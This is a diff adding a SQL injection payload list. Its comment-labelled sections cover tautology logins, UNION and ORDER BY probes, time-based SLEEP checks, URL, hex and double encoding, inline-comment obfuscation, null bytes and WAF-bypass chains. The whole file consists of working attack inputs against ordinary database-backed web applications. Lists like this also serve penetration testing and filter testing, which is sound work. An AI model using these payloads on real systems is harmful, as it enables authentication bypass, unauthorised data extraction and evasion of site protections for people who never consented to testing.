@@ -1,0 +1,54 @@
+# Generic SQL injection advanced payloads
+' OR '1'='1'--
+' OR '1'='1'#
+" OR "1"="1"--
+') OR ('1'='1'--
+' AND '1'='2'--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' ORDER BY 1--
+' ORDER BY 10--
+'; SELECT SLEEP(5)--
+' OR SLEEP(5)--
+1 AND 1=1
+1 AND 1=2
+1 OR 1=1
+admin'--
+admin'#
+'/**/OR/**/'1'='1
+' OR 1=1 LIMIT 1--
+' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--
+# URL-encoded variants
+%27+OR+1%3D1--+-
+%27+AND+1%3D1--+-
+%27+UNION+SELECT+NULL--+-
+%2527+OR+1%3D1--
+%2527+UNION+SELECT+NULL--
+# Hex-encoded quote
+\x27 OR 1=1-- -
+\x27 UNION SELECT NULL-- -
+# Unicode quote
+' OR 1=1-- -
+# Double-quote variants
+" OR 1=1-- -
+" AND 1=1-- -
+" UNION SELECT NULL-- -
+%22+OR+1%3D1--+-
+%22+AND+1%3D1--+-
+# Backtick variants (MySQL)
+` OR 1=1-- -
+# Mixed case bypass
+sElEcT * fRoM users wHeRe 1=1-- -
+1' oR '1'='1
+1' aNd '1'='1
+# Plus-encoded spaces
+1'+UNION+SELECT+NULL+FROM+users--+-
+# Comment injection
+1'/**/UNION/**/SELECT/**/NULL--+-
+1'/*!UNION*//*!SELECT*/NULL--+-
+# NULL byte
+1'\x00 OR 1=1-- -
+1'%00 OR 1=1-- -
+# WAF bypass chains
+1'+UNION+ALL+SELECT+NULL,NULL,NULL--+-
